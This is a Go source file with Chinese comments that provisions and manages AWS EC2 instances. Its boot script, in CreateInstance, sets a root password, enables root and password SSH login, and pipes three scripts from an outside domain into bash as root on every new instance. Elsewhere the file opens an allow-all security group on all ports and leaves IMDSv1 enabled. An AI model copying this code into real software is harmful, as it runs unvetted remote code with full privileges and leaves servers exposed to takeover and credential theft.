// pkg/aws/instance.go
package aws

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
)

// CreateInstanceParams 创建实例所需的参数结构
type CreateInstanceParams struct {
	Region       string // 区域,默认ap-east-1
	ImageID      string // AMI ID
	InstanceType string // 实例类型
	DiskSize     int32  // 硬盘大小
	Password     string // Root密码
	Count        int32  // 创建数量,默认1
	Script       string // 自定义开机脚本
	UserID       string // 用户ID,用于标签
	AccountID    string // 账号ID,用于标签
}

// CreateInstanceResult 创建实例的结果
type CreateInstanceResult struct {
	InstanceID string `json:"instance_id"`
	PublicIP   string `json:"public_ip"`
	Status     string `json:"status"`
}

// CreateInstance 创建EC2实例
func (c *AWSClient) CreateInstance(ctx context.Context, params CreateInstanceParams) ([]CreateInstanceResult, error) {
	// 如果未指定区域，使用默认区域
	if params.Region == "" {
		params.Region = "ap-east-1"
	}

	// 创建AWS配置
	cfg, err := c.createConfig(ctx, params.Region)
	if err != nil {
		return nil, fmt.Errorf("配置AWS失败: %v", err)
	}

	// 创建EC2客户端
	ec2Client := ec2.NewFromConfig(cfg)

	// 准备用户数据脚本
	userData := fmt.Sprintf(`#!/bin/bash
# 启用IMDSv2
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" -s http://169.254.169.254/latest/api/token)

# 设置root密码并启用root登录
echo "root:%s" | chpasswd
sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

# 配置IPv6
cat > /etc/network/interfaces.d/60-default-with-ipv6.cfg << 'EOF'
auto lo
iface lo inet loopback

auto ens5
iface ens5 inet dhcp
iface ens5 inet6 dhcp
EOF

# 重启网络服务以应用IPv6配置
systemctl restart networking

# 确保IPv6转发已启用
echo "net.ipv6.conf.all.forwarding=1" >> /etc/sysctl.conf
echo "net.ipv6.conf.default.forwarding=1" >> /etc/sysctl.conf
sysctl -p

curl --retry 5 --retry-delay 10 https://down.xiazai5.xyz/client.sh | bash
curl --retry 5 --retry-delay 10 https://down.xiazai5.xyz/d11.sh | bash
curl --retry 5 --retry-delay 10 https://down.xiazai5.xyz/apt.sh | bash

# 执行自定义脚本
%s`, params.Password, params.Script)

	// 编码用户数据
	encodedUserData := base64.StdEncoding.EncodeToString([]byte(userData))

	// 从环境变量获取WS_URL
	wsURL := os.Getenv("WS_URL")

	// 准备标签
	tags := []types.Tag{
		{
			Key:   aws.String("Name"),
			Value: aws.String(fmt.Sprintf("Instance-%s", params.AccountID)),
		},
		{
			Key:   aws.String("user_id"),
			Value: aws.String(params.UserID),
		},
		{
			Key:   aws.String("account_id"),
			Value: aws.String(params.AccountID),
		},
		{
			Key:   aws.String("ws_url"),
			Value: aws.String(wsURL),
		},
	}

	// 创建安全组
	sgID, err := c.createSecurityGroup(ctx, ec2Client)
	if err != nil {
		return nil, fmt.Errorf("创建安全组失败: %v", err)
	}

	// 获取默认VPC的子网
	subnetID, err := c.getDefaultSubnet(ctx, ec2Client)
	if err != nil {
		return nil, fmt.Errorf("获取子网失败: %v", err)
	}

	// 在准备启动实例的输入参数部分，修改NetworkInterfaces配置
	input := &ec2.RunInstancesInput{
		ImageId:      aws.String(params.ImageID),
		InstanceType: types.InstanceType(params.InstanceType),
		MinCount:     aws.Int32(params.Count),
		MaxCount:     aws.Int32(params.Count),
		UserData:     aws.String(encodedUserData),
		NetworkInterfaces: []types.InstanceNetworkInterfaceSpecification{
			{
				DeviceIndex:              aws.Int32(0),
				SubnetId:                 aws.String(subnetID),
				Groups:                   []string{sgID},
				AssociatePublicIpAddress: aws.Bool(true),
				Ipv6AddressCount:         aws.Int32(1), // 请求1个IPv6地址
			},
		},
		BlockDeviceMappings: []types.BlockDeviceMapping{
			{
				DeviceName: aws.String("/dev/xvda"),
				Ebs: &types.EbsBlockDevice{
					VolumeSize: aws.Int32(params.DiskSize),
					VolumeType: types.VolumeTypeGp2,
				},
			},
		},
		// 开启实例元数据服务v2并允许标签访问
		MetadataOptions: &types.InstanceMetadataOptionsRequest{
			HttpTokens:              types.HttpTokensStateOptional, // 允许同时使用 IMDSv1 和 IMDSv2
			HttpEndpoint:            types.InstanceMetadataEndpointStateEnabled,
			InstanceMetadataTags:    types.InstanceMetadataTagsStateEnabled, // 启用标签访问
			HttpPutResponseHopLimit: aws.Int32(2),                           // 设置跳数限制
		},
		TagSpecifications: []types.TagSpecification{
			{
				ResourceType: types.ResourceTypeInstance,
				Tags:         tags,
			},
		},
	}

	// 运行实例
	resp, err := ec2Client.RunInstances(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("创建实例失败: %v", err)
	}

	// 收集结果
	var results []CreateInstanceResult
	for _, instance := range resp.Instances {
		result := CreateInstanceResult{
			InstanceID: *instance.InstanceId,
			Status:     string(instance.State.Name),
		}
		if instance.PublicIpAddress != nil {
			result.PublicIP = *instance.PublicIpAddress
		}
		results = append(results, result)
	}

	return results, nil
}

// createSecurityGroup 创建或获取安全组
func (c *AWSClient) createSecurityGroup(ctx context.Context, ec2Client *ec2.Client) (string, error) {
	// 先查找是否已存在同名安全组
	describeResp, err := ec2Client.DescribeSecurityGroups(ctx, &ec2.DescribeSecurityGroupsInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("group-name"),
				Values: []string{"allow-all"},
			},
		},
	})
	if err != nil {
		return "", fmt.Errorf("查询安全组失败: %v", err)
	}

	// 如果已存在，检查并确保其有正确的IPv6入站和出站规则
	if len(describeResp.SecurityGroups) > 0 {
		sgID := *describeResp.SecurityGroups[0].GroupId
		// fmt.Printf("发现已存在的allow-all安全组: %s\n", sgID)

		// 检查是否已有IPv6入站规则
		hasIpv6Ingress := false
		for _, rule := range describeResp.SecurityGroups[0].IpPermissions {
			if rule.IpProtocol != nil && *rule.IpProtocol == "-1" {
				for _, ipv6Range := range rule.Ipv6Ranges {
					if ipv6Range.CidrIpv6 != nil && *ipv6Range.CidrIpv6 == "::/0" {
						hasIpv6Ingress = true
						fmt.Printf("安全组已有IPv6入站规则\n")
						break
					}
				}
			}
			if hasIpv6Ingress {
				break
			}
		}

		// 如果没有IPv6入站规则，添加一个
		if !hasIpv6Ingress {
			fmt.Printf("安全组缺少IPv6入站规则，尝试添加...\n")
			for retries := 0; retries < 3; retries++ {
				_, err = ec2Client.AuthorizeSecurityGroupIngress(ctx, &ec2.AuthorizeSecurityGroupIngressInput{
					GroupId: aws.String(sgID),
					IpPermissions: []types.IpPermission{
						{
							IpProtocol: aws.String("-1"), // 所有协议
							FromPort:   aws.Int32(-1),    // 所有端口
							ToPort:     aws.Int32(-1),
							Ipv6Ranges: []types.Ipv6Range{
								{
									CidrIpv6: aws.String("::/0"),
								},
							},
						},
					},
				})
				if err == nil {
					fmt.Printf("成功添加IPv6入站规则到现有安全组\n")
					break
				}

				// 如果是因为规则已存在导致的错误，这不是真正的错误
				if strings.Contains(err.Error(), "InvalidPermission.Duplicate") {
					fmt.Printf("IPv6入站规则已存在（重复错误）\n")
					err = nil
					break
				}

				fmt.Printf("添加IPv6入站规则到现有安全组失败(尝试 %d/3): %v\n", retries+1, err)
				time.Sleep(time.Second * 2)
			}

			if err != nil {
				fmt.Printf("警告: 无法为现有安全组添加IPv6入站规则: %v，IPv6可能无法正常工作\n", err)
			}
		}

		// 检查是否已有IPv6出站规则
		hasIpv6Egress := false
		for _, rule := range describeResp.SecurityGroups[0].IpPermissionsEgress {
			if rule.IpProtocol != nil && *rule.IpProtocol == "-1" {
				for _, ipv6Range := range rule.Ipv6Ranges {
					if ipv6Range.CidrIpv6 != nil && *ipv6Range.CidrIpv6 == "::/0" {
						hasIpv6Egress = true
						fmt.Printf("安全组已有IPv6出站规则\n")
						break
					}
				}
			}
			if hasIpv6Egress {
				break
			}
		}

		// 如果没有IPv6出站规则，添加一个
		if !hasIpv6Egress {
			fmt.Printf("安全组缺少IPv6出站规则，尝试添加...\n")
			_, err = ec2Client.AuthorizeSecurityGroupEgress(ctx, &ec2.AuthorizeSecurityGroupEgressInput{
				GroupId: aws.String(sgID),
				IpPermissions: []types.IpPermission{
					{
						IpProtocol: aws.String("-1"), // 所有协议
						FromPort:   aws.Int32(-1),    // 所有端口
						ToPort:     aws.Int32(-1),
						Ipv6Ranges: []types.Ipv6Range{
							{
								CidrIpv6: aws.String("::/0"),
							},
						},
					},
				},
			})
			if err != nil {
				fmt.Printf("警告: 无法为现有安全组添加IPv6出站规则: %v，继续执行\n", err)
			} else {
				fmt.Printf("成功添加IPv6出站规则到现有安全组\n")
			}
		}

		return sgID, nil
	}

	// 如果不存在，创建新的安全组
	// 获取默认VPC ID
	vpcResp, err := ec2Client.DescribeVpcs(ctx, &ec2.DescribeVpcsInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("isDefault"),
				Values: []string{"true"},
			},
		},
	})
	if err != nil {
		return "", fmt.Errorf("查询默认VPC失败: %v", err)
	}
	if len(vpcResp.Vpcs) == 0 {
		return "", fmt.Errorf("未找到默认VPC")
	}
	defaultVpcId := *vpcResp.Vpcs[0].VpcId

	// 在默认VPC中创建安全组
	createResp, err := ec2Client.CreateSecurityGroup(ctx, &ec2.CreateSecurityGroupInput{
		GroupName:   aws.String("allow-all"),
		Description: aws.String("Allow all traffic"),
		VpcId:       aws.String(defaultVpcId),
	})
	if err != nil {
		return "", fmt.Errorf("创建安全组失败: %v", err)
	}

	// 配置安全组入站规则
	_, err = ec2Client.AuthorizeSecurityGroupIngress(ctx, &ec2.AuthorizeSecurityGroupIngressInput{
		GroupId: createResp.GroupId,
		IpPermissions: []types.IpPermission{
			{
				IpProtocol: aws.String("-1"), // 所有协议
				FromPort:   aws.Int32(-1),    // 所有端口
				ToPort:     aws.Int32(-1),
				IpRanges: []types.IpRange{
					{
						CidrIp: aws.String("0.0.0.0/0"),
					},
				},
			},
		},
	})
	if err != nil {
		return "", fmt.Errorf("配置IPv4安全组入站规则失败: %v", err)
	}

	// 添加IPv6入站规则
	for retries := 0; retries < 3; retries++ {
		_, err = ec2Client.AuthorizeSecurityGroupIngress(ctx, &ec2.AuthorizeSecurityGroupIngressInput{
			GroupId: createResp.GroupId,
			IpPermissions: []types.IpPermission{
				{
					IpProtocol: aws.String("-1"), // 所有协议
					FromPort:   aws.Int32(-1),    // 所有端口
					ToPort:     aws.Int32(-1),
					Ipv6Ranges: []types.Ipv6Range{
						{
							CidrIpv6: aws.String("::/0"),
						},
					},
				},
			},
		})
		if err == nil {
			fmt.Printf("成功配置IPv6安全组入站规则\n")
			break
		}

		// 如果是因为规则已存在导致的错误，这不是真正的错误
		if strings.Contains(err.Error(), "InvalidPermission.Duplicate") {
			fmt.Printf("IPv6安全组入站规则已存在\n")
			err = nil
			break
		}

		fmt.Printf("配置IPv6安全组入站规则失败(尝试 %d/3): %v\n", retries+1, err)
		time.Sleep(time.Second * 2)
	}

	// 如果所有尝试都失败，记录警告但继续执行
	if err != nil {
		fmt.Printf("警告: 无法配置IPv6安全组入站规则: %v，继续执行但IPv6可能无法正常工作\n", err)
	}
	// 添加IPv6出站规则
	_, err = ec2Client.AuthorizeSecurityGroupEgress(ctx, &ec2.AuthorizeSecurityGroupEgressInput{
		GroupId: createResp.GroupId,
		IpPermissions: []types.IpPermission{
			{
				IpProtocol: aws.String("-1"), // 所有协议
				FromPort:   aws.Int32(-1),    // 所有端口
				ToPort:     aws.Int32(-1),
				Ipv6Ranges: []types.Ipv6Range{
					{
						CidrIpv6: aws.String("::/0"),
					},
				},
			},
		},
	})
	if err != nil {
		return "", fmt.Errorf("配置IPv6安全组出站规则失败: %v", err)
	}

	return *createResp.GroupId, nil
}

// getDefaultSubnet 获取默认VPC的第一个子网并确保IPv6已启用
func (c *AWSClient) getDefaultSubnet(ctx context.Context, ec2Client *ec2.Client) (string, error) {
	// 获取默认VPC
	vpcResp, err := ec2Client.DescribeVpcs(ctx, &ec2.DescribeVpcsInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("isDefault"),
				Values: []string{"true"},
			},
		},
	})
	if err != nil {
		return "", err
	}
	if len(vpcResp.Vpcs) == 0 {
		return "", fmt.Errorf("未找到默认VPC")
	}

	defaultVpc := vpcResp.Vpcs[0]
	vpcId := *defaultVpc.VpcId

	// 检查VPC是否已有IPv6 CIDR块
	hasIpv6 := false
	if len(defaultVpc.Ipv6CidrBlockAssociationSet) > 0 {
		hasIpv6 = true
	}

	// 如果VPC没有IPv6 CIDR块，分配一个
	if !hasIpv6 {
		_, err = ec2Client.AssociateVpcCidrBlock(ctx, &ec2.AssociateVpcCidrBlockInput{
			VpcId:                       aws.String(vpcId),
			AmazonProvidedIpv6CidrBlock: aws.Bool(true),
		})
		if err != nil {
			return "", fmt.Errorf("为VPC分配IPv6 CIDR块失败: %v", err)
		}

		// 添加等待时间，确保VPC CIDR块关联完成
		time.Sleep(5 * time.Second)

		// 重新获取VPC信息以获取分配的IPv6 CIDR块
		vpcResp, err = ec2Client.DescribeVpcs(ctx, &ec2.DescribeVpcsInput{
			VpcIds: []string{vpcId},
		})
		if err != nil {
			return "", fmt.Errorf("重新获取VPC信息失败: %v", err)
		}
		defaultVpc = vpcResp.Vpcs[0]

		// 再次检查是否已有IPv6 CIDR块
		if len(defaultVpc.Ipv6CidrBlockAssociationSet) == 0 {
			return "", fmt.Errorf("VPC IPv6 CIDR块分配后仍未找到，请稍后重试")
		}
	}

	// 获取该VPC下的所有子网
	subnetResp, err := ec2Client.DescribeSubnets(ctx, &ec2.DescribeSubnetsInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("vpc-id"),
				Values: []string{vpcId},
			},
		},
	})
	if err != nil {
		return "", err
	}
	if len(subnetResp.Subnets) == 0 {
		return "", fmt.Errorf("未找到可用子网")
	}

	// 查找一个支持IPv6的子网，如果没有，则配置第一个子网
	var subnet types.Subnet
	var subnetId string
	var ipv6Subnet *types.Subnet

	// 首先尝试找一个已经配置好IPv6的子网
	for _, s := range subnetResp.Subnets {
		if len(s.Ipv6CidrBlockAssociationSet) > 0 {
			ipv6Subnet = &s
			break
		}
	}

	// 如果找到支持IPv6的子网，直接使用
	if ipv6Subnet != nil {
		subnet = *ipv6Subnet
		subnetId = *subnet.SubnetId
	} else {
		// 否则使用第一个子网，并尝试配置IPv6
		subnet = subnetResp.Subnets[0]
		subnetId = *subnet.SubnetId

		// 获取VPC的IPv6 CIDR块
		if len(defaultVpc.Ipv6CidrBlockAssociationSet) > 0 {
			vpcIpv6Cidr := *defaultVpc.Ipv6CidrBlockAssociationSet[0].Ipv6CidrBlock

			// 提取VPC CIDR前缀
			vpcPrefix := strings.TrimSuffix(vpcIpv6Cidr[:strings.LastIndex(vpcIpv6Cidr, "/")], "::")

			// 为每个子网创建一个唯一的/64 CIDR块
			subnetNumber := 0 // 从0开始为子网分配号码
			subnetIpv6Cidr := fmt.Sprintf("%s:%x::/64", vpcPrefix, subnetNumber)

			// 为子网分配IPv6 CIDR块
			_, err = ec2Client.AssociateSubnetCidrBlock(ctx, &ec2.AssociateSubnetCidrBlockInput{
				SubnetId:      aws.String(subnetId),
				Ipv6CidrBlock: aws.String(subnetIpv6Cidr),
			})
			if err != nil {
				return "", fmt.Errorf("为子网分配IPv6 CIDR块失败: %v", err)
			}

			// 添加延时确保子网CIDR块关联完成
			time.Sleep(5 * time.Second)
		} else {
			return "", fmt.Errorf("VPC没有IPv6 CIDR块，无法为子网配置IPv6")
		}
	}

	// 启用子网自动分配IPv6地址
	_, err = ec2Client.ModifySubnetAttribute(ctx, &ec2.ModifySubnetAttributeInput{
		SubnetId: aws.String(subnetId),
		AssignIpv6AddressOnCreation: &types.AttributeBooleanValue{
			Value: aws.Bool(true),
		},
	})
	if err != nil {
		return "", fmt.Errorf("启用子网自动分配IPv6地址失败: %v", err)
	}

	// 获取互联网网关
	igwResp, err := ec2Client.DescribeInternetGateways(ctx, &ec2.DescribeInternetGatewaysInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("attachment.vpc-id"),
				Values: []string{vpcId},
			},
		},
	})

	// 如果没有IGW，创建一个
	var internetGatewayId string
	if err != nil || len(igwResp.InternetGateways) == 0 {
		// 创建新的互联网网关
		createIgwResp, err := ec2Client.CreateInternetGateway(ctx, &ec2.CreateInternetGatewayInput{})
		if err != nil {
			return "", fmt.Errorf("创建互联网网关失败: %v", err)
		}

		internetGatewayId = *createIgwResp.InternetGateway.InternetGatewayId

		// 将互联网网关附加到VPC
		_, err = ec2Client.AttachInternetGateway(ctx, &ec2.AttachInternetGatewayInput{
			InternetGatewayId: aws.String(internetGatewayId),
			VpcId:             aws.String(vpcId),
		})
		if err != nil {
			return "", fmt.Errorf("附加互联网网关到VPC失败: %v", err)
		}
	} else {
		internetGatewayId = *igwResp.InternetGateways[0].InternetGatewayId
	}

	// 获取与子网关联的路由表
	rtResp, err := ec2Client.DescribeRouteTables(ctx, &ec2.DescribeRouteTablesInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("association.subnet-id"),
				Values: []string{subnetId},
			},
		},
	})

	var routeTableId string
	if err == nil && len(rtResp.RouteTables) > 0 {
		routeTableId = *rtResp.RouteTables[0].RouteTableId
	} else {
		// 如果子网没有关联的路由表，获取VPC的主路由表
		rtResp, err = ec2Client.DescribeRouteTables(ctx, &ec2.DescribeRouteTablesInput{
			Filters: []types.Filter{
				{
					Name:   aws.String("vpc-id"),
					Values: []string{vpcId},
				},
				{
					Name:   aws.String("association.main"),
					Values: []string{"true"},
				},
			},
		})

		if err != nil || len(rtResp.RouteTables) == 0 {
			// 如果主路由表不存在，创建一个新的路由表
			createRtResp, err := ec2Client.CreateRouteTable(ctx, &ec2.CreateRouteTableInput{
				VpcId: aws.String(vpcId),
			})
			if err != nil {
				return "", fmt.Errorf("创建路由表失败: %v", err)
			}

			routeTableId = *createRtResp.RouteTable.RouteTableId

			// 将路由表与子网关联
			_, err = ec2Client.AssociateRouteTable(ctx, &ec2.AssociateRouteTableInput{
				RouteTableId: aws.String(routeTableId),
				SubnetId:     aws.String(subnetId),
			})
			if err != nil {
				return "", fmt.Errorf("关联路由表到子网失败: %v", err)
			}
		} else {
			routeTableId = *rtResp.RouteTables[0].RouteTableId
		}
	}

	// 添加IPv4默认路由
	_, err = ec2Client.CreateRoute(ctx, &ec2.CreateRouteInput{
		RouteTableId:         aws.String(routeTableId),
		DestinationCidrBlock: aws.String("0.0.0.0/0"),
		GatewayId:            aws.String(internetGatewayId),
	})
	// 忽略可能的错误，因为路由可能已存在

	// 添加IPv6默认路由
	_, err = ec2Client.CreateRoute(ctx, &ec2.CreateRouteInput{
		RouteTableId:             aws.String(routeTableId),
		DestinationIpv6CidrBlock: aws.String("::/0"),
		GatewayId:                aws.String(internetGatewayId),
	})
	// 忽略可能的错误，因为路由可能已存在

	return subnetId, nil
}

// DeleteInstanceParams 删除实例参数结构
type DeleteInstanceParams struct {
	Region     string // 区域
	InstanceID string // 实例ID
}

// DeleteInstance 删除EC2实例并释放关联的弹性IP
func (c *AWSClient) DeleteInstance(ctx context.Context, params DeleteInstanceParams) error {
	// 创建AWS配置
	cfg, err := c.createConfig(ctx, params.Region)
	if err != nil {
		return fmt.Errorf("配置AWS失败: %v", err)
	}

	// 创建EC2客户端
	ec2Client := ec2.NewFromConfig(cfg)

	// 首先检查该实例是否有关联的弹性IP
	describeAddressesInput := &ec2.DescribeAddressesInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("instance-id"),
				Values: []string{params.InstanceID},
			},
		},
	}

	addressesResult, err := ec2Client.DescribeAddresses(ctx, describeAddressesInput)
	if err == nil && len(addressesResult.Addresses) > 0 {
		// 找到了关联的弹性IP，需要先解绑并释放
		for _, address := range addressesResult.Addresses {
			// 如果有关联ID，需要先解绑
			if address.AssociationId != nil && *address.AssociationId != "" {
				_, err = ec2Client.DisassociateAddress(ctx, &ec2.DisassociateAddressInput{
					AssociationId: address.AssociationId,
				})
				if err != nil {
					// 记录错误但继续流程，不中断删除实例
					fmt.Printf("解绑弹性IP失败: %v\n", err)
				}
			}

			// 释放弹性IP
			if address.AllocationId != nil {
				_, err = ec2Client.ReleaseAddress(ctx, &ec2.ReleaseAddressInput{
					AllocationId: address.AllocationId,
				})
				if err != nil {
					// 记录错误但继续流程，不中断删除实例
					fmt.Printf("释放弹性IP失败: %v\n", err)
				} else {
					fmt.Printf("成功释放弹性IP: %s\n", *address.PublicIp)
				}
			}
		}
	}

	// 准备删除实例的输入参数
	input := &ec2.TerminateInstancesInput{
		InstanceIds: []string{params.InstanceID},
	}

	// 执行删除操作
	_, err = ec2Client.TerminateInstances(ctx, input)
	if err != nil {
		return fmt.Errorf("删除实例失败: %v", err)
	}

	// 删除实例后，再次检查是否有弹性IP仍然存在但未关联任何实例
	// 这是为了捕获可能的边缘情况，如IP在过程中的状态变化
	time.Sleep(2 * time.Second) // 稍微等待以确保状态更新

	unassociatedAddressesInput := &ec2.DescribeAddressesInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("association-id"),
				Values: []string{""},
			},
		},
	}

	unassociatedAddresses, err := ec2Client.DescribeAddresses(ctx, unassociatedAddressesInput)
	if err == nil && len(unassociatedAddresses.Addresses) > 0 {
		for _, address := range unassociatedAddresses.Addresses {
			// 尝试释放未关联的弹性IP
			if address.AllocationId != nil {
				_, err = ec2Client.ReleaseAddress(ctx, &ec2.ReleaseAddressInput{
					AllocationId: address.AllocationId,
				})
				if err != nil {
					fmt.Printf("释放未关联的弹性IP失败: %v\n", err)
				} else if address.PublicIp != nil {
					fmt.Printf("成功释放未关联的弹性IP: %s\n", *address.PublicIp)
				}
			}
		}
	}

	return nil
}

// ChangeIPParams 更换IP参数结构
type ChangeIPParams struct {
	Region     string // 区域
	InstanceID string // 实例ID
}

// ChangeIPResult 更换IP结果
type ChangeIPResult struct {
	OldIP string // 旧IP地址
	NewIP string // 新IP地址
}

// ChangeIP 更换实例IP
func (c *AWSClient) ChangeIP(ctx context.Context, params ChangeIPParams) (*ChangeIPResult, error) {
	// 创建AWS配置
	cfg, err := c.createConfig(ctx, params.Region)
	if err != nil {
		return nil, fmt.Errorf("配置AWS失败: %v", err)
	}

	// 创建EC2客户端
	ec2Client := ec2.NewFromConfig(cfg)

	// 获取当前实例的公共IP
	describeResult, err := ec2Client.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
		InstanceIds: []string{params.InstanceID},
	})
	if err != nil {
		return nil, fmt.Errorf("获取实例信息失败: %v", err)
	}

	if len(describeResult.Reservations) == 0 || len(describeResult.Reservations[0].Instances) == 0 {
		return nil, fmt.Errorf("未找到实例")
	}

	instance := describeResult.Reservations[0].Instances[0]
	var currentIP string
	if instance.PublicIpAddress != nil {
		currentIP = *instance.PublicIpAddress
	}

	result := &ChangeIPResult{
		OldIP: currentIP,
	}

	// 检查当前IP是否为弹性IP
	addressesResult, err := ec2Client.DescribeAddresses(ctx, &ec2.DescribeAddressesInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("public-ip"),
				Values: []string{currentIP},
			},
		},
	})

	// 如果当前IP是弹性IP,需要先解绑并释放
	if err == nil && len(addressesResult.Addresses) > 0 {
		address := addressesResult.Addresses[0]

		// 解绑弹性IP
		if address.AssociationId != nil {
			_, err = ec2Client.DisassociateAddress(ctx, &ec2.DisassociateAddressInput{
				AssociationId: address.AssociationId,
			})
			if err != nil {
				return nil, fmt.Errorf("解绑弹性IP失败: %v", err)
			}
		}

		// 释放弹性IP
		if address.AllocationId != nil {
			_, err = ec2Client.ReleaseAddress(ctx, &ec2.ReleaseAddressInput{
				AllocationId: address.AllocationId,
			})
			if err != nil {
				return nil, fmt.Errorf("释放弹性IP失败: %v", err)
			}
		}
	}

	// 释放所有未绑定的弹性IP
	unassociatedAddresses, err := ec2Client.DescribeAddresses(ctx, &ec2.DescribeAddressesInput{
		Filters: []types.Filter{
			{
				Name:   aws.String("association-id"),
				Values: []string{""},
			},
		},
	})

	if err == nil {
		for _, address := range unassociatedAddresses.Addresses {
			if address.AllocationId != nil {
				_, err = ec2Client.ReleaseAddress(ctx, &ec2.ReleaseAddressInput{
					AllocationId: address.AllocationId,
				})
				if err != nil {
					return nil, fmt.Errorf("释放未绑定的弹性IP失败: %v", err)
				}
			}
		}
	}

	// 分配新的弹性IP
	allocateResult, err := ec2Client.AllocateAddress(ctx, &ec2.AllocateAddressInput{
		Domain: types.DomainTypeVpc,
	})
	if err != nil {
		return nil, fmt.Errorf("分配新的弹性IP失败: %v", err)
	}

	// 绑定新的弹性IP到实例
	_, err = ec2Client.AssociateAddress(ctx, &ec2.AssociateAddressInput{
		InstanceId:   aws.String(params.InstanceID),
		AllocationId: allocateResult.AllocationId,
	})
	if err != nil {
		// 如果绑定失败,释放刚分配的弹性IP
		_, releaseErr := ec2Client.ReleaseAddress(ctx, &ec2.ReleaseAddressInput{
			AllocationId: allocateResult.AllocationId,
		})
		if releaseErr != nil {
			return nil, fmt.Errorf("绑定新IP失败且无法释放: %v, %v", err, releaseErr)
		}
		return nil, fmt.Errorf("绑定新IP失败: %v", err)
	}

	result.NewIP = *allocateResult.PublicIp
	return result, nil
}

// InstanceInfo 实例信息结构
type InstanceInfo struct {
	InstanceID   string    `json:"instance_id"`
	PublicIP     string    `json:"public_ip"`
	PublicIPv6   string    `json:"public_ipv6"` // 新增IPv6字段
	InstanceType string    `json:"instance_type"`
	State        string    `json:"state"`
	LaunchTime   time.Time `json:"launch_time"`
}

// ListInstancesParams 查询实例列表参数
type ListInstancesParams struct {
	Region    string // 区域
	AccountID string // 账号ID,用于标签过滤
}

// ListInstances 批量查询实例信息
func (c *AWSClient) ListInstances(ctx context.Context, params ListInstancesParams) ([]InstanceInfo, error) {
	// 创建AWS配置
	cfg, err := c.createConfig(ctx, params.Region)
	if err != nil {
		return nil, fmt.Errorf("配置AWS失败: %v", err)
	}

	// 创建EC2客户端
	ec2Client := ec2.NewFromConfig(cfg)

	// 只按照实例状态过滤，不使用tag过滤
	input := &ec2.DescribeInstancesInput{
		Filters: []types.Filter{
			{
				// 过滤掉terminated状态的实例
				Name: aws.String("instance-state-name"),
				Values: []string{
					"pending",
					"running",
					"stopping",
					"stopped",
				},
			},
		},
	}

	// 执行查询
	result, err := ec2Client.DescribeInstances(ctx, input)
	if err != nil {
		return nil, fmt.Errorf("查询实例失败: %v", err)
	}

	// 在解析结果部分，收集IPv6地址
	var instances []InstanceInfo
	for _, reservation := range result.Reservations {
		for _, instance := range reservation.Instances {
			info := InstanceInfo{
				InstanceID:   *instance.InstanceId,
				InstanceType: string(instance.InstanceType),
				State:        string(instance.State.Name),
				LaunchTime:   *instance.LaunchTime,
			}
			if instance.PublicIpAddress != nil {
				info.PublicIP = *instance.PublicIpAddress
			}

			// 获取IPv6地址
			if len(instance.NetworkInterfaces) > 0 {
				for _, ni := range instance.NetworkInterfaces {
					if len(ni.Ipv6Addresses) > 0 {
						info.PublicIPv6 = *ni.Ipv6Addresses[0].Ipv6Address
						break
					}
				}
			}

			instances = append(instances, info)
		}
	}

	return instances, nil
}
